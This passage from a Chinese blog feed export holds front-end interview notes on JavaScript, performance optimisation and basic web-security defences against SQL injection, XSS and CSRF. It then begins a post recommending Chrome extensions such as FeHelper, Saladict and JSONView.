<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0.5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//利用sort return 大于等于0不交换位置，小于0交换位置</span><span class="token comment" spellcheck="true">// [5, 8, 4, 3, 2, 9, 10, 6, 1, 7]</span>复制代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数组去重操作"><a href="#数组去重操作" class="headerlink" title="数组去重操作"></a>数组去重操作</h3><ul><li><code>ES6 Set</code></li><li><code>for</code>循环 <code>indexOf</code></li><li><code>for</code>循环 <code>includes</code></li><li><code>sort</code></li></ul><p><a href="https://juejin.cn/post/6844904035619700750" target="_blank" rel="noopener">详细操作前往：https://juejin.cn/post/6844904035619700750</a></p><h3 id="JS-原生拖拽节点"><a href="#JS-原生拖拽节点" class="headerlink" title="JS 原生拖拽节点"></a>JS 原生拖拽节点</h3><ul><li>给需要拖拽的节点绑定 <code>mousedown , mousemove , mouseup</code> 事件</li><li><code>mousedown</code> 事件触发后，开始拖拽</li><li><code>mousemove</code> 时，需要通过 <code>event.clientX 和 clientY</code>获取拖拽位置，并实时更新位置</li><li><code>mouseup</code> 时，拖拽结束</li><li>需要注意浏览器边界值，设置拖拽范围</li></ul><h3 id="深拷贝、浅拷贝"><a href="#深拷贝、浅拷贝" class="headerlink" title="深拷贝、浅拷贝"></a>深拷贝、浅拷贝</h3><ul><li><p>所有的基础数据类型的赋值操作都是深拷贝</p></li><li><p>通常利用上面这点，来对引用数据类型做递归深拷贝</p></li><li><p>浅拷贝：<code>Object.assign</code> 或者 扩展运算符</p></li><li><p>深拷贝：</p><pre><code>JSON.parse(JSON.stringify(object))</code></pre><p> 深层递归</p><ul><li>局限性：会忽略 undefined，不能序列化函数，不能解决循环引用的对象</li></ul></li></ul><p><a href="https://juejin.cn/post/6906369563793817607" target="_blank" rel="noopener">详细信息更多：https://juejin.cn/post/6906369563793817607**</a></p><h3 id="节流防抖"><a href="#节流防抖" class="headerlink" title="节流防抖"></a>节流防抖</h3><ul><li>节流：每隔一段时间执行一次，通常用在高频率触发的地方，降低频率。–如：鼠标滑动 拖拽</li><li>防抖：一段时间内连续触发，不执行，直到超出限定时间执行最后一次。–如：<code>input</code> 模糊搜索</li></ul><p><a href="https://juejin.cn/post/6844903592898330638" target="_blank" rel="noopener">更多节流、防抖，细节介绍：https://juejin.cn/post/6844903592898330638</a></p><h3 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h3><blockquote><p>当执行 <code>JS</code> 代码时，会生成执行环境，只要代码不是写在函数中的，就是在全局执行环境中，函数中的代码会产生函数执行环境，只此两种执行环境</p></blockquote><p>```js b() // call b console.log(a) // undefined var a = ‘Hello world’ function b() { console.log(‘call b’) } ```</p><blockquote><p>变量提升 这是因为函数和变量提升的原因。通常提升的解释是说将声明的代码移动到了顶部，这其实没有什么错误，便于大家理解。但是更准确的解释应该是：在生成执行环境时，会有两个阶段。第一个阶段是创建的阶段，<code>JS</code>解释器会找出需要提升的变量和函数，并且给他们提前在内存中开辟好空间，函数的话会将整个函数存入内存中，变量只声明并且赋值为 <code>undefined</code> ，所以在第二个阶段，也就是代码执行阶段，我们可以直接提前使用</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// call b second</span><span class="token keyword">function</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'call b fist'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'call b second'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token string">'Hello world'</span>复制代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="js单线程"><a href="#js单线程" class="headerlink" title="js单线程"></a>js单线程</h3><ul><li><p>单线程 - 只有一个线程，只能做一件事</p></li><li><p>原因 - 避免 </p><pre><code>DOM</code></pre><p> 渲染的冲突</p><ul><li>浏览器需要渲染 <code>DOM</code></li><li><code>JS</code> 可以修改 <code>DOM</code>结构</li><li><code>JS</code> 执行的时候，浏览器 <code>DOM</code>渲染会暂停</li><li>两段 <code>JS</code> 也不能同时执行（都修改 <code>DOM</code> 就冲突了）</li><li><code>webworker</code> 支持多线程，但是不能访问 <code>DOM</code></li></ul></li><li><p>解决方案 - 异步</p></li></ul><h3 id="说说event-loop"><a href="#说说event-loop" class="headerlink" title="说说event loop"></a>说说event loop</h3><blockquote><p>首先， <code>js</code>是单线程的，主要的任务是处理用户的交互，而用户的交互无非就 是响应<code>DOM</code> 的增删改，使用事件队列的形式，一次事件循环只处理一个事件 响应，使得脚本执行相对连续，所以有了事件队列，用来储存待执行的事件， 那么事件队列的事件从哪里被 <code>push</code> 进来的呢。那就是另外一个线程叫事件触 发线程做的事情了，他的作用主要是在定时触发器线程、异步 <code>HTTP</code> 请求线程 满足特定条件下的回调函数 <code>push</code> 到事件队列中，等待 <code>js</code>引擎空闲的时候去 执行，当然<code>js</code>引擎执行过程中有优先级之分，首先<code>js</code>引擎在一次事件循环中， 会先执行js线程的主任务，然后会去查找是否有微任务 <code>microtask（promise）</code>，如果有那就优先执行微任务，如果没有，在去查找 宏任务<code>macrotask（setTimeout、setInterval）</code> 进行执行</p></blockquote><p><a href="https://juejin.cn/post/6844903598573240327" target="_blank" rel="noopener">更详细的介绍前往：https://juejin.cn/post/6844903598573240327</a></p><h3 id="描述下this"><a href="#描述下this" class="headerlink" title="描述下this"></a>描述下this</h3><blockquote><p><code>this</code>，函数执行的上下文，可以通过 <code>apply ， call ， bind</code>改变 <code>this</code> 的指向。对于匿名函数或者直接调用的函数来说，this指向全局上下文（浏览 器为<code>window，NodeJS为 global</code>），剩下的函数调用，那就是谁调用它， <code>this</code>就指向谁。当然还有<code>es6</code>的箭头函数，箭头函数的指向取决于该箭头函 数声明的位置，在哪里声明， <code>this</code>就指向哪里</p></blockquote><h3 id="ajax、axios、fetch区别"><a href="#ajax、axios、fetch区别" class="headerlink" title="ajax、axios、fetch区别"></a>ajax、axios、fetch区别</h3><p>ajax：</p><ul><li>本身是针对<code>MVC</code> 的编程,不符合现在前端<code>MVVM</code>的浪潮</li><li>基于原生的 <code>XHR</code>开发， <code>XHR</code> 本身的架构不清晰，已经有了 <code>fetch</code>的替代方案</li><li><code>JQuery</code> 整个项目太大，单纯使用 <code>ajax</code> 却要引入整个 <code>JQuery</code> 非常的不合理（采取个性化打包的方案又不能享受<code>CDN</code>服务）</li></ul><p>axios：</p><ul><li>从浏览器中创建 <code>XMLHttpRequest</code></li><li>从 <code>node.js</code> 发出 <code>http</code>请求</li><li>支持<code>Promise API</code></li><li>拦截请求和响应</li><li>转换请求和响应数据</li><li>取消请求</li><li>自动转换<code>JSON</code>数据</li><li>客户端支持防止 <code>CSRF/XSRF</code></li></ul><p>fetch：</p><ul><li><p>只对网络请求报错，对 400 ， 500 都当做成功的请求，需要封装去处理</p></li><li><p>默认不会带 <code>cookie</code> ，需要添加配置项（尴尬）</p></li><li><p>本身无自带 <code>abort</code>，无法超时控制，可以使用AbortController解决取消请求问题。</p></li><li><p>没有办法原生监测请求的进度，而<code>XHR</code>可以</p></li></ul><p><a href="http://www.ruanyifeng.com/blog/2020/12/fetch-tutorial.html" target="_blank" rel="noopener">更多fetch知识前往：阮一峰 fetch</a></p><h2 id="优化-篇"><a href="#优化-篇" class="headerlink" title="优化 篇"></a>优化 篇</h2><h3 id="SEO优化"><a href="#SEO优化" class="headerlink" title="SEO优化"></a>SEO优化</h3><ul><li>合理的 <code>title 、 description 、 keywords</code>：搜索对着三项的权重逐个减小， <code>title</code>值强调重点即可，重要关键词出现不要超过2次，而且要靠前，不同页面 <code>title</code>要有所不同； <code>description</code>把页面内容高度概括，长度合适，不可过分堆砌关键词，不同页面<code>description</code>有所不同； <code>keywords</code> 列举出重要关键词即可</li><li>语义化的<code>HTML</code> 代码，符合W3C规范：语义化代码让搜索引擎容易理解网页</li><li>重要内容<code>HTML</code>代码放在最前：搜索引擎抓取<code>HTML</code> 顺序是从上到下，有的搜索引擎对抓取长度有限制，保证重要内容一定会被抓取</li><li>重要内容不要用 <code>js</code> 输出：爬虫不会执行js获取内容</li><li>少用 <code>iframe</code>：搜索引擎不会抓取 <code>iframe</code>中的内容</li><li>非装饰性图片必须加<code>alt</code></li><li>提高网站速度：网站速度是搜索引擎排序的一个重要指标</li></ul><h3 id="server优化"><a href="#server优化" class="headerlink" title="server优化"></a>server优化</h3><ul><li>减少<code>HTTP</code>请求，合并文件、雪碧图</li><li>减少<code>DNS</code>查询，使用缓存</li><li>减少<code>Dom</code>元素的数量</li><li>使用<code>CDN</code></li><li>配置<code>ETag</code>,http缓存的手段</li><li>对组件使用<code>Gzip</code>压缩</li><li>减少<code>cookie</code>的大小</li></ul><h3 id="css优化"><a href="#css优化" class="headerlink" title="css优化"></a>css优化</h3><ul><li>将样式表放在页面顶部</li><li>使用<code>less scss</code>表达式</li><li>使用<code>link</code>不适用<code>@import</code>引入样式</li><li>压缩<code>css</code></li><li>禁止使用 <code>gif</code>图片实现 <code>loading</code> 效果（降低 CPU 消耗，提升渲染性能）</li><li>使用 <code>CSS3</code>代码代替 <code>JS</code> 动画（尽可能避免重绘重排以及回流）</li><li>对于一些小图标，可以使用<code>base64</code>位编码，以减少网络请求。</li><li>页面头部的 <code>&lt;style&gt; &lt;script&gt;</code> 会阻塞页面；（因为 Renderer进程中 JS 线程和渲染线程是互斥的）</li><li>当需要设置的样式很多时设置 <code>className</code>而不是直接操作 <code>style</code></li></ul><h3 id="js方面"><a href="#js方面" class="headerlink" title="js方面"></a>js方面</h3><ul><li>将脚本放到页面底部</li><li>将<code>js</code>外部引入</li><li>压缩<code>js</code></li><li>使用<code>Eslint</code>语法检测</li><li>减少<code>Dom</code>的操作</li><li>熟练使用设计模式</li><li>禁止使用 <code>iframe</code>（阻塞父文档 <code>onload</code> 事件）</li><li>页面中空的 <code>href 和 src</code>会阻塞页面其他资源的加载</li><li>网页 <code>gzip ， CDN</code>托管， <code>data</code> 缓存 ，图片服务器</li></ul><h3 id="webpack优化点"><a href="#webpack优化点" class="headerlink" title="webpack优化点"></a>webpack优化点</h3><ul><li>代码压缩插件<code>UglifyJsPlugin</code></li><li>服务器启用<code>gzip</code>压缩</li><li>按需加载资源文件<code>require.ensure</code></li><li>优化 <code>devtool</code>中的 <code>source-map</code></li><li>剥离 <code>css</code> 文件，单独打包</li><li>去除不必要插件，通常就是开发环境与生产环境用同一套配置文件导致</li><li>开发环境不做无意义的工作如提取 <code>css</code>计算文件hash等</li><li>配置 <code>devtool</code></li><li>优化构建时的搜索路径 指明需要构建目录及不需要构建目录</li></ul><h3 id="其他优化点"><a href="#其他优化点" class="headerlink" title="其他优化点"></a>其他优化点</h3><p>为什么利用多个域名来存储网站资源会更有效？</p><ul><li><code>CDN</code> 缓存更方便</li><li>突破浏览器并发限制</li><li>节约 <code>cookie</code> 带宽</li><li>节约主域名的连接数，优化页面响应速度</li><li>防止不必要的安全问题</li></ul><h2 id="Other-篇"><a href="#Other-篇" class="headerlink" title="Other 篇"></a>Other 篇</h2><h3 id="从用户刷新网页开始，一次js请求一般情况下有哪些地方会有缓存处理？"><a href="#从用户刷新网页开始，一次js请求一般情况下有哪些地方会有缓存处理？" class="headerlink" title="从用户刷新网页开始，一次js请求一般情况下有哪些地方会有缓存处理？"></a>从用户刷新网页开始，一次js请求一般情况下有哪些地方会有缓存处理？</h3><ul><li><code>dns</code> 缓存</li><li><code>cdn</code>缓存</li><li>浏览器缓存</li><li>服务器缓存</li></ul><h3 id="常见web安全及防护原理"><a href="#常见web安全及防护原理" class="headerlink" title="常见web安全及防护原理"></a>常见web安全及防护原理</h3><ul><li><pre><code>sql</code></pre><p> 注入原理：就是通过把 </p><pre><code>SQL</code></pre><p> 命令插入到 </p><pre><code>Web </code></pre><p>表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的</p><pre><code>SQL</code></pre><p>命令</p><ul><li>永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双 “-“ 进行转换等</li><li>永远不要使用动态拼装SQL，可以使用参数化的 SQL 或者直接使用存储过程进行数据查询存取</li><li>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接</li><li>不要把机密信息明文存放，请加密或者 hash 掉密码和敏感的信息</li></ul></li><li><pre><code>XSS</code></pre><p>防范方法：</p><pre><code>Xss(cross-site scripting)</code></pre><p> 攻击指的是攻击者往</p><pre><code> Web </code></pre><p>页面里插入恶意 </p><pre><code>html</code></pre><p> 标签或者 </p><pre><code>javascript </code></pre><p>代码。比如：攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取</p><pre><code> cookie </code></pre><p>中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点</p><ul><li>首先代码里对用户输入的地方和变量都需要仔细检查长度和对 ”&lt;”,”&gt;”,”;”,”’” 等字符做过滤；其次任何内容写到页面之前都必须加以<code>encode</code>，避免不小心把<code>html tag</code> 弄出来。这一个层面做好，至少可以堵住超过一半的<code>XSS</code> 攻击</li></ul></li><li><pre><code>XSS与CSRF</code></pre><p>有什么区别：</p><pre><code>XSS </code></pre><p>是获取信息，不需要提前知道其他用户页面的代码和数据包。 </p><pre><code>CSRF</code></pre><p> 是代替用户完成指定的动作，需要知道其他用户页面的代码和数据包。要完成一次 </p><pre><code>CSRF</code></pre><p> 攻击，受害者必须依次完成两个步骤，1.登录受信任网站 A ，并在本地生成 </p><pre><code>Cookie</code></pre><p> 。2.在不登出 A 的情况下，访问危险网站 B</p><ul><li>服务端的<code>CSRF</code> 方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数</li><li>通过验证码的方法</li></ul></li></ul><h3 id="用过哪些设计模式"><a href="#用过哪些设计模式" class="headerlink" title="用过哪些设计模式"></a>用过哪些设计模式</h3><ul><li>单例模式</li><li>策略模式</li><li>代理模式</li><li>迭代器模式</li><li>发布—订阅模式</li></ul><p><a href="https://www.cnblogs.com/imwtr/p/9451129.html" target="_blank" rel="noopener">更多设计模式15种：https://www.cnblogs.com/imwtr/p/9451129.html</a></p><h3 id="Node的应用场景"><a href="#Node的应用场景" class="headerlink" title="Node的应用场景"></a>Node的应用场景</h3><ul><li>特点<ul><li>它是一个<code>javascript</code>运行环境</li><li>依赖于<code>chrome V8</code>引擎进行代码解释</li><li>事件驱动</li><li>非阻塞 I/o</li><li>单进程，单线程</li></ul></li><li>优点<ul><li>对于文件的读写处理效率极高</li><li>高并发（<code>node</code>最重要的优点）</li></ul></li><li>缺点<ul><li>只支持单核<code>CPU</code>，不能充分利用 <code>CPU</code></li><li>可靠性低，一旦代码某个环节崩溃，整个系统都崩溃</li></ul></li></ul><h3 id="那些操作会造成内存泄漏？"><a href="#那些操作会造成内存泄漏？" class="headerlink" title="那些操作会造成内存泄漏？"></a>那些操作会造成内存泄漏？</h3><ul><li>内存泄漏指任何对象在您不再拥有或需要它之后仍然存在</li><li><code>setTimeout</code>的第一个参数使用字符串而非函数的话，会引发内存泄漏</li><li>闭包使用不当</li></ul><h3 id="简单介绍下webpack"><a href="#简单介绍下webpack" class="headerlink" title="简单介绍下webpack"></a>简单介绍下webpack</h3><p><code>WebPack</code> 是一个模块打包工具，你可以使用 <code>WebPack</code> 管理你的模块依赖，并编绎输出模块们所需的静态文件。它能够很好地管理、打包 <code>Web</code> 开发中所用到的 <code>HTML 、 Javascript 、 CSS</code>以及各种静态文件（图片、字体等），让开发过程更加高效。对于不同类型的资源， <code>webpack</code>有对应的模块加载器。 <code>webpack</code>模块打包器会分析模块间的依赖关系，最后 生成了优化且合并后的静态资源。</p><h3 id="谈谈你对gulp的了解"><a href="#谈谈你对gulp的了解" class="headerlink" title="谈谈你对gulp的了解"></a>谈谈你对gulp的了解</h3><ul><li><p><code>gulp</code> 是前端开发过程中一种基于流的代码构建工具，是自动化项目的构建利器；它不仅能对网站资源进行优化，而且在开发过程中很多重复的任务能够使用正确的工具自动完成</p></li><li><p><code>gulp</code>的核心概念：流</p></li><li><p>流，简单来说就是建立在面向对象基础上的一种抽象的处理数据的工具。在流中，定义了一些处理数据的基本操作，如读取数据，写入数据等，程序员是对流进行所有操作的，而不用关心流的另一头数据的真正流向</p></li><li><p><code>gulp</code>正是通过流和代码优于配置的策略来尽量简化任务编写的工作</p></li><li><pre><code>Gulp</code></pre><p>的特点：</p><ul><li>易于使用：通过代码优于配置的策略，<code>gulp</code> 让简单的任务简单，复杂的任务可管理</li><li>构建快速 利用 <code>Node.js</code> 流的威力，你可以快速构建项目并减少频繁的 IO 操作</li><li>易于学习 通过最少的<code>API</code>，掌握 <code>gulp</code> 毫不费力，构建工作尽在掌握：如同一系列流管道</li></ul></li></ul><h3 id="渐进增强和优雅降级"><a href="#渐进增强和优雅降级" class="headerlink" title="渐进增强和优雅降级"></a>渐进增强和优雅降级</h3><ul><li>渐进增强 ：针对低版本浏览器进行构建页面，保证最基本的功能，然后再针对高级浏览器进行效果、交互等改进和追加功能达到更好的用户体验。</li><li>优雅降级 ：一开始就构建完整的功能，然后再针对低版本浏览器进行兼容</li></ul><h3 id="谈一谈你理解的函数式编程"><a href="#谈一谈你理解的函数式编程" class="headerlink" title="谈一谈你理解的函数式编程"></a>谈一谈你理解的函数式编程</h3><ul><li>简单说，”函数式编程”是一种”编程范式”<code>（programming paradigm）</code>，也就是如何编写程序的方法论</li><li>它具有以下特性：闭包和高阶函数、惰性计算、递归、函数是”第一等公民”、只用”表达式”</li></ul><p><a href="https://zhuanlan.zhihu.com/p/57708956" target="_blank" rel="noopener">想了解更多，移步这里：https://zhuanlan.zhihu.com/p/57708956</a></p><h3 id="Vue的双向绑定数据的原理"><a href="#Vue的双向绑定数据的原理" class="headerlink" title="Vue的双向绑定数据的原理"></a>Vue的双向绑定数据的原理</h3><p><code>vue.js</code>则是采用数据劫持结合发布者-订阅者模式的方式，通过<code>Object.defineProperty()</code>来劫持各个属性的 <code>setter ， getter</code>，在数据变动时发布消息给订阅者，触发相应的监听回调</p><h3 id="写个简单Loader"><a href="#写个简单Loader" class="headerlink" title="写个简单Loader"></a>写个简单Loader</h3><blockquote><pre><code>loader `就是一个 `node `模块，它输出了一个函数。当某种资源需要用这个 `loader` 转换时，这个函数会被调用。并且，这个函数可以通过提供给它的 `this `上下文访问 `Loader API 。 reverse-txt-loader</code></pre></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 定义</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//src是原文件内容（abcde），下面对内容进行处理，这里是反转</span> <span class="token keyword">var</span> result <span class="token operator">=</span> src<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回JavaScript源码，必须是String或者Buffer</span> <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`module.exports = '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>result<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">'`</span></span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//使用</span><span class="token punctuation">{</span>test<span class="token punctuation">:</span> <span class="token regex">/\.txt$/</span><span class="token punctuation">,</span>use<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">'./path/reverse-txt-loader'</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>复制代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><ul><li>自我介绍</li><li>面试完你还有什么问题要问的吗</li><li>你有什么爱好?</li><li>你最大的优点和缺点是什么?</li><li>你为什么会选择这个行业，职位?</li><li>你觉得你适合从事这个岗位吗?</li><li>你有什么职业规划?</li><li>你对工资有什么要求?</li><li>如何看待前端开发？</li><li>未来三到五年的规划是怎样的？</li><li>你的项目中技术难点是什么？遇到了什么问题？你是怎么解决的？</li><li>你们部门的开发流程是怎样的</li><li>你认为哪个项目做得最好？</li><li>说下工作中你做过的一些性能优化处理</li><li>最近在看哪些前端方面的书？</li><li>平时是如何学习前端开发的？</li><li>你最有成就感的一件事</li><li>你为什么要离开前一家公司？</li><li>你对加班的看法</li><li>你希望通过这份工作获得什么？</li></ul>]]></content>
      
      
      <categories>
          
          <category> 大前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chrome实用插件整理</title>
      <link href="2021/02/02/Chrome%E5%AE%9E%E7%94%A8%E6%8F%92%E4%BB%B6%E6%95%B4%E7%90%86/"/>
      <url>2021/02/02/Chrome%E5%AE%9E%E7%94%A8%E6%8F%92%E4%BB%B6%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="FEHelper"><a href="#FEHelper" class="headerlink" title="FEHelper"></a>FEHelper</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>本插件支持<strong>Chrome、Firefox、MS-Edge</strong>浏览器，内部工具集持续增加，目前包括 JSON自动/手动格式化、JSON内容比对、代码美化与压缩、信息编解码转换、二维码生成与解码、图片Base64编解码转换、Markdown、 网页油猴、网页取色器、脑图(Xmind)等贴心工具，甚至在目前新版本的FeHelper中，还集成了<strong>FH开发者工具</strong>， 如果你也想自己搞一个工具集成到FeHelper中，那这一定能满足到你。另外，本站也提供部分工具的在线版本，欢迎使用，欢迎反馈！</p><h3 id="插件预览"><a href="#插件预览" class="headerlink" title="插件预览"></a>插件预览</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmheu6xvffj30su0m2wmd.jpg" alt="image-20210109140754976">  </p><h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h3><p><a href="https://github.com/zxlie/FeHelper/tree/master/apps/static/screenshot/crx" target="_blank" rel="noopener">传送门</a></p><h2 id="沙拉查词"><a href="#沙拉查词" class="headerlink" title="沙拉查词"></a>沙拉查词</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>沙拉查词最新版是一款十分好用的网页划词翻译Chrome插件，沙拉查词Saladict官方版定制化程度高，内容也相当丰富，沙拉查词插件聚合词典专业划词翻译，只要选中网页内单词后点击右上角的沙拉图标，Saladict就会为你检索必应词典、海词词典、Urban Dictionary等，助你全方位掌握外文词汇。</p><h3 id="插件预览-1"><a href="#插件预览-1" class="headerlink" title="插件预览"></a>插件预览</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmhf3nl4c6j30vv0a643m.jpg" alt="image-20210109141703053">  </p><h3 id="下载地址-1"><a href="#下载地址-1" class="headerlink" title="下载地址"></a>下载地址</h3><p><a href="https://saladict.crimx.com/" target="_blank" rel="noopener">传送门</a></p><h2 id="JSONView"><a href="#JSONView" class="headerlink" title="JSONView"></a>JSONView</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>json格式化查看工具</p><h3 id="插件预览-2"><a href="#插件预览-2" class="headerlink" title="插件预览"></a>插件预览</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmhfbs2eowj30os06tjrz.jpg" alt="image-20210109142451289">  </p><h3 id="下载地址-2"><a href="#下载地址-2" class="headerlink" title="下载地址"></a>下载地址</h3><p><a href="https://github.com/gildas-lormeau/JSONView-for-Chrome" target="_blank" rel="noopener">传送门</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul><li>GitHub下载插件<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmhff9lxv6j30zj0bt0v2.jpg" alt="image-20210109142812308"></li><li>解压压缩包<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmhfjtkelsj30gi05s0ti.jpg" alt="image-20210109143234823">  </li><li>打开Chrome扩展程序 chrome://extensions/</li><li>点击加载已解压的扩展程序<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmhfluz4qaj30w80f7jtw.jpg" alt="image-20210109143432988"></li><li>选择刚刚解压的扩展程序即可完成安装<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmhfn93qxij30u70emdlu.jpg" alt="image-20210109143553131">  </li></ul><h2 id="Markdown-Here"><a href="#Markdown-Here" class="headerlink" title="Markdown Here"></a>Markdown Here</h2><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><p>这对于那些不喜欢在撰写电邮时反复摆弄排版按钮的人无疑是好消息。 它特别适合那些要在电子邮件中插入代码的程序员们 —— 没错，它甚至支持语法高亮显示。 对于我们之中的数学家们而言，Markdown Here也支持转换TeX公式。</p><p>使用起来十分简易：</p><ol><li>在你的电子邮箱客户端的富文本编辑器中使用Github风格的Markdown。</li><li>在编辑区右击然后选择 “Markdown Toggle”。</li><li>你的电子邮件现在看起来非常漂亮! (它已经被检测并转换为HTML格式)</li><li>如果你很满意这样的外观就直接发送吧。 如果你想更改或者添加些什么，再次点击 “Markdown Toggle” 可以返回到你原始的Markdown文本。</li><li>如有必要，重复以上步骤</li></ol><h3 id="插件预览-3"><a href="#插件预览-3" class="headerlink" title="插件预览"></a>插件预览</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmhfvlq90gj325e0u0k0y.jpg" alt="image-20210109144354569"></p><h3 id="下载地址-3"><a href="#下载地址-3" class="headerlink" title="下载地址"></a>下载地址</h3><p><a href="https://chrome.google.com/webstore/detail/markdown-here/elifhakcjgalahccnjkneoccemfahfoa/related?utm_source=chrome-app-launcher-info-dialog" target="_blank" rel="noopener">传送门</a></p><h2 id="扩展管理器"><a href="#扩展管理器" class="headerlink" title="扩展管理器"></a>扩展管理器</h2><h3 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h3><p>一键管理所有扩展，快速开启/禁用、批量闪电管理，智能排序，右键卸载、锁定、选项配置，角标提醒，大小布局随心配。快捷、简单、安全。</p><p>一键开启/禁用扩展</p><ol><li>闪电分组：根据场景快速开启/禁用扩展组（被锁定或主题类扩展除外）</li><li>智能排序：可根据您的使用频率智能排序（默认根据名称排序）</li><li>右键菜单：提供锁定、卸载、选项配置、主页、APP运行等快捷功能</li><li>智能搜索：通过关键字或词组快速找到需要的扩展</li><li>角标提醒：实时显示扩展状态，用完后提醒重置，减少资源占用（被锁定或主题类扩展除外）</li><li>视图选择：提供列表视图和网格视图，符合用户习惯</li><li>分组管理：普通分组和固定分组，灵活管理</li><li>扩展命名：给扩展起一个你喜欢的别名</li><li>自动匹配：可以根据不同的网站开启和关闭扩展</li></ol><h3 id="插件预览-4"><a href="#插件预览-4" class="headerlink" title="插件预览"></a>插件预览</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmhlfycuuzj317g0u0nk9.jpg" alt="image-20210109175624346"></p><h3 id="下载地址-4"><a href="#下载地址-4" class="headerlink" title="下载地址"></a>下载地址</h3><p><a href="https://chrome.google.com/webstore/detail/extension-manager/gjldcdngmdknpinoemndlidpcabkggco" target="_blank" rel="noopener">传送门</a></p><h2 id="有道云笔记网页剪报"><a href="#有道云笔记网页剪报" class="headerlink" title="有道云笔记网页剪报"></a>有道云笔记网页剪报</h2><h3 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h3><p>一键保存精彩网页，多终端同步，永久珍藏</p><p>有道云笔记网页剪报Chrome插件帮助您轻松地将任意网页内容保存到有道云笔记中，云端存储，永不丢失。支持右键划选部分网页，也可以自动提取正文进行保存。同时，还能方便地同步到有道云笔记桌面版、手机版，随时随地查看</p><h3 id="插件预览-5"><a href="#插件预览-5" class="headerlink" title="插件预览"></a>插件预览</h3><p><img 